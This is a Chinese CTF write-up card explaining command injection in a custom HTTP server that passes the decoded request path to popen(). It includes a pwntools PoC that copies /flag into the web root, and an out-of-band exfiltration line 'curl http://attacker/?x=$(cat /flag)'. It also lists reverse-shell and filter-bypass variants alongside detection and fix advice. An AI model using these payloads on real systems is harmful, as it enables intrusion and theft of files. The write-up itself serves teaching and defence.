---
id: ctf-pwn-httpd-path-popen-command-injection
title: 自定义 HTTP 服务把请求路径交给 popen：URL 编码空格注入系统命令并读取 flag
type: scenario
domain: ctf
path: ctf/pwn
technique: httpd-request-path-popen-command-injection
aliases:
- 羊城杯2024 httpd
- haystack popen
- 请求路径命令注入
- 双重 URL 编码绕过
- popen 命令执行
tags:
- ctf
- pwn
- command-injection
- popen
- http-server
- url-encoding
- path-traversal
- web
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V273
  verified_at: '2026-11-08T01:02:32+08:00'
  notes: 已对照原文 httpd 段与图 21-24 核对：chdir /home/ctf/html、sscanf 请求行解析、黑名单只拦首字符/..、以 ../ 开头、含 /../、以 /.. 结尾、freopen /dev/null 后 popen(haystack)、get /cp%20/flag%20/home/ctf/html 后再 GET /flag 回显 flag 均一致；PoC 与原文 exp 一致。未验证点：未连远程目标复跑。
---

## 一句话结论

一个自实现的轻量 HTTP 服务先对请求行做 `sscanf` 解析，再把 URL 解码后的请求路径（变量 `haystack`）直接传给 `popen()` 执行；黑名单只拦截 `..`、`/../` 等目录穿越串，不拦截空格和 shell 元字符，因此把路径写成 `/cp%20/flag%20/home/ctf/html`，解码后即成为 `cp /flag /home/ctf/html`，先把 flag 复制到 web 根目录，再正常 GET 读取。

## 原理

- **popen 的语义**：`popen(cmd, mode)` 由 `/bin/sh -c cmd` 执行命令，命令串里的空格、`;`、`|`、`$()`、反引号、重定向符都会被 shell 解释。只要 `cmd` 含用户可控内容，就不是“打开文件”，而是“执行命令”。
- **用户输入直达 sink**：程序把请求行的第二个 token 当作路径/文件名，先做长度和黑名单检查，随后将该变量直接传给 `popen(haystack, modes)`。路径没有经过 `execve` 参数数组、也没有做 shell 转义，因此可控。
- **黑名单只防穿越、不防命令注入**：检查项为“首字符 `/`、等于 `..`、以 `../` 开头、包含 `/../`、以 `/..` 结尾”，目的是阻止目录穿越读文件；它没有检查空格、分号、管道、命令替换，也没有把路径限制在 web 根目录下。攻击者不需要 `..`，只需让路径成为一个合法命令。
- **空格从哪来**：请求行本身按空格分词，直接写 `/cp /flag ...` 会把命令拆成多个 token；把空格写成 `%20` 可让它留在第二个 token 内，服务端 URL 解码后还原为空格，`sscanf` 阶段看不到真正的分隔符。文章称 GET 场景可再用一次 URL 编码绕过检查，实际利用的关键是“解码发生在分词/黑名单之后（或黑名单看不到解码后的空格）”。
- **为什么先复制再读**：popen 的输出被丢弃（程序把 stdout/stderr 重定向到 `/dev/null`），命令执行结果不可见；但命令可以把 `/flag` 复制到服务自身的 web 根目录 `/home/ctf/html`，然后第二次普通 GET 请求即可由服务读文件返回。这样把“盲命令执行”转成可回显的任意文件读取。

## 触发条件

- 服务端以 `popen`/`system` 执行拼接了用户输入的命令（尤其是把 URL 路径、文件名、`Host`、`User-Agent` 等请求字段当命令）。
- 对进入命令的输入只做了目录穿越或关键字黑名单，没有 shell 转义、白名单或参数化执行。
- 请求路径支持百分号编码，且服务端会在分词/校验后解码（或直接使用解码后的值）。
- 目标进程对 flag 等敏感文件有读权限，且 web 根目录可写（用于把文件搬到可访问位置）；或命令本身有带外通道。

## 利用步骤

1. 发送构造请求，让路径解码后成为复制命令。示例请求行：
   `get /cp%20/flag%20/home/ctf/html HTTP/1.0`
   服务端解码 `%20` 为空格后，`haystack` 等价于 `cp /flag /home/ctf/html`（是否保留前导 `/` 取决于实现，实际可按目标源码微调；前导 `/` 可能被程序剥掉或需改成编码形式）。
2. 补齐程序要求的头（如 `Host: 127.0.0.1`）和 `Content-Length`，发送后关闭连接。
3. 重新连接，正常 GET 已复制到 web 根的文件：`get /flag HTTP/1.0`，读取响应体中的 flag。
4. 若命令输出未被丢弃，可直接把回显写回响应；若目标不允许写 web 目录，可改用带外通道（`curl http://attacker/?x=$(cat /flag)`、DNS 查询、反弹 shell）或 `base64` 后分块外带。

## PoC

```python
from pwn import remote

# 第一次：命令注入，把 /flag 复制到 web 根
io = remote("target", 32514)
io.sendline(b"get /cp%20/flag%20/home/ctf/html HTTP/1.0")
io.sendline(b"Host: 127.0.0.1")
io.sendline(b"Content-Length: 80")
io.close()

# 第二次：正常请求读取已复制到 web 根的文件
io = remote("target", 32514)
io.sendline(b"get /flag HTTP/1.0")
io.sendline(b"Host: 127.0.0.1")
io.sendline(b"Content-Length: 80")
print(io.recvall(timeout=3))
```

```text
# 服务端行为等价于：
# popen("/bin/sh -c 'cp /flag /home/ctf/html'", "r")
# 随后 GET /flag 由服务的文件读取分支返回 /home/ctf/html/flag
```

## 变体与关联

- **命令分隔变体**：空格被过滤时用 `${IFS}`、`$'\x20'`、Tab（`%09`）、换行（`%0a`）代替；命令串联用 `;`（`%3b`）、`|`（`%7c`）、`&&`（`%26%26`）、反引号或 `$()`。
- **编码变体**：单层/双层/混合编码（`%2520`、`%2e%2e%2f`）用于绕过“先检查后解码”或“先解码后检查”的黑名单；关键是找出解码与校验的先后顺序。
- **路径穿越变体**：若目标只把路径当文件名打开，可用 `../`、`%2e%2e%2f`、`....//` 等读取任意文件；与命令注入结合时，穿越可用来定位可写目录或配置文件。
- **回显变体**：popen 输出被重定向到 `/dev/null` 时，采用“复制到 web 根”“写日志/临时文件”“带外 HTTP/DNS”“反弹 shell”等通道。
- **关联卡片**：[[ctf-pwn-raw-socket-admin-token-command-injection]]（自实现服务解析请求后拼接命令）、[[iot-tenda-ac15-goform-telnet-command-injection]]（`doSystemCmd` 拼接参数）、[[web-generic-file-inclusion-double-encoded-alternating-dotdot-traversal]]（双重编码目录穿越黑名单绕过）。
- **边界**：命令 sink 改用 `execve`/`posix_spawn` 传参数数组、对输入做 shell 转义或只允许固定白名单时，本链不成立；web 根目录不可写且无带外通道时，只能盲执行，无法取回结果。

## 检测与防御

- **检测**：请求路径中出现 `%20`、`%09`、`%0a`、`%3b`、`%7c`、`$(`、反引号、`${IFS}` 等 shell 特征；请求行第二个 token 含空格或命令名（`cp`、`cat`、`sh`、`curl`）；服务进程拉起 `sh -c` 子进程并访问敏感文件；web 根目录出现非业务新增文件。
- **修复**：不要用 `popen`/`system` 执行含用户输入的命令；文件读取改用固定目录 + `open`/`read`，路径经 `realpath` 规范化后校验前缀；必须执行外部程序时用 `execve` 参数数组并固定参数，不经过 shell。
- **加固**：对 URL 只解码一次，解码后按白名单字符集校验；限制服务进程权限与可写目录；监控 web 根目录文件完整性；关闭不需要的 shell 与外部命令。
